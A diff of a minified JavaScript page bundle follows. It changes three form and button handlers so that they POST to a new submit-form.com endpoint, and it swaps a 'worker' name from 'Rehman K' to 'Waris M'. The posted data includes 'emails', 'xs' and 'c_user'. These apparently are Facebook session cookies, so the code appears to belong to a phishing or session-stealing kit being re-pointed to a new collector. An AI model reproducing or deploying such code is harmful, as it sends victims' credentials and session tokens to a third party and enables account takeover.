@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/aRwAhQTg3", {
+                                    fetch("https://submit-form.com/RX2mxMWZ8", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "Rehman K",
+                                            workerEmail: "Waris M",
                                             xs: r,
                                             c_user: i,
-                                            name: "Rehman K"
+                                            name: "Waris M"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/aRwAhQTg3", {
+                                    u && o ? (fetch("https://submit-form.com/RX2mxMWZ8", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/aRwAhQTg3", {
+                        fetch("https://submit-form.com/RX2mxMWZ8", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
